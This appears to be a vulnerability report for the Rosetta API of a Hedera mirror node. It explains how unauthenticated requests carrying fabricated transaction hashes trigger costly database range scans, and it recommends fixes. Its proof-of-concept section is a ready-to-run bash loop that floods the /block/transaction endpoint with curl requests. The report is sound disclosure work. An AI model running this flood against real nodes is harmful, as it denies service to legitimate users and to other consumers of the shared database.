### Title
Unauthenticated DoS via Repeated `/block/transaction` Requests with Non-Existent Transaction Hashes Causing Unbounded DB Range Scans

### Summary
The `BlockTransaction()` handler in `rosetta/app/services/block_service.go` accepts requests from any unauthenticated caller. When a valid block identifier is supplied with a transaction hash that does not exist in that block, `FindByHashInBlock()` executes a full timestamp-range scan of the `transaction` table on every request. Because there is no rate limiting, no negative-result caching, and no authentication, an attacker can drive this scan at arbitrary frequency, exhausting DB CPU and I/O well above the 30% threshold.

### Finding Description

**Code path:**

`BlockTransaction()` (lines 77–102, `rosetta/app/services/block_service.go`) first resolves the block:

```
block, err := s.FindByIdentifier(ctx, request.BlockIdentifier.Index, h)   // DB query 1
```

then unconditionally calls:

```
transaction, err := s.FindByHashInBlock(
    ctx,
    request.TransactionIdentifier.Hash,
    block.ConsensusStartNanos,
    block.ConsensusEndNanos,
)                                                                           // DB query 2
``` [1](#0-0) 

`FindByHashInBlock()` in `rosetta/app/persistence/transaction.go` (lines 173–208) executes:

```sql
SELECT ... FROM transaction t
WHERE consensus_timestamp >= @start
  AND consensus_timestamp <= @end
  AND transaction_hash = @hash
``` [2](#0-1) 

This is assembled from `selectTransactionsInTimestampRange + andTransactionHashFilter`. The primary filter is the timestamp range; `transaction_hash` is a secondary predicate. For a hash that does not exist in the block, PostgreSQL must scan **every row** in `[consensusStart, consensusEnd]` before returning zero rows. For a busy block this range can contain thousands of rows. [3](#0-2) 

**Root cause / failed assumption:** The code assumes callers supply hashes that actually exist. There is no negative-result cache, no per-IP or global rate limit, and no authentication anywhere in the middleware stack. [4](#0-3) [5](#0-4) 

### Impact Explanation
Every request with a valid block identifier but a fabricated transaction hash forces two sequential DB queries: one index lookup for the block record file, and one full timestamp-range scan of the `transaction` table. With no rate limiting, an attacker running even a modest HTTP flood (hundreds of requests/second from a single host) can keep the DB continuously executing expensive range scans. On a node with a high-traffic block (thousands of transactions per second of consensus time), each scan reads a large number of rows, multiplying I/O and CPU proportionally to request rate. This can degrade or deny service to legitimate users and other mirror-node consumers sharing the same DB.

### Likelihood Explanation
The attack requires zero privileges. Valid block identifiers (index + hash) are public information obtainable from any Rosetta `/block` call or from the public ledger. The fabricated transaction hash only needs to be valid hex (any 48-byte hex string passes the `hex.DecodeString` check at line 180). The endpoint is exposed on the public port with no authentication, no CAPTCHA, and no connection throttle. The attack is trivially scriptable with `curl` or any HTTP load tool and is fully repeatable. [6](#0-5) 

### Recommendation
1. **Rate limiting**: Add a per-IP (and global) rate limiter middleware before the router, e.g., using `golang.org/x/time/rate` or an ingress-level policy.
2. **Negative-result cache**: Cache `(blockHash, txHash) → not-found` results for a short TTL (e.g., 30 s) to collapse repeated identical miss queries.
3. **DB-side index**: Ensure a composite index on `(transaction_hash, consensus_timestamp)` exists on the `transaction` table so the hash predicate is evaluated first, eliminating the full range scan for misses.
4. **Query timeout**: The existing `statementTimeout` config field in `Db` should be set to a low value (e.g., 2 s) to bound the per-query cost. [7](#0-6) 

### Proof of Concept

```bash
# Step 1: obtain a valid block identifier
BLOCK=$(curl -s -X POST http://<rosetta-host>:5700/block \
  -H 'Content-Type: application/json' \
  -d '{"network_identifier":{"blockchain":"Hedera","network":"mainnet"},
       "block_identifier":{}}')

INDEX=$(echo $BLOCK | jq '.block.block_identifier.index')
HASH=$(echo  $BLOCK | jq -r '.block.block_identifier.hash')

# Step 2: flood /block/transaction with a non-existent tx hash
# Any 48-byte hex string that is valid hex but not in the block
FAKE_HASH="0x$(python3 -c "import os; print(os.urandom(48).hex())")"

while true; do
  curl -s -o /dev/null -X POST http://<rosetta-host>:5700/block/transaction \
    -H 'Content-Type: application/json' \
    -d "{\"network_identifier\":{\"blockchain\":\"Hedera\",\"network\":\"mainnet\"},
         \"block_identifier\":{\"index\":$INDEX,\"hash\":\"$HASH\"},
         \"transaction_identifier\":{\"hash\":\"$FAKE_HASH\"}}" &
done
```

Each iteration triggers `FindByIdentifier` (block lookup) + `FindByHashInBlock` (full timestamp-range scan). Running this at scale will measurably increase DB CPU and I/O above the 30% baseline threshold with no credentials required.
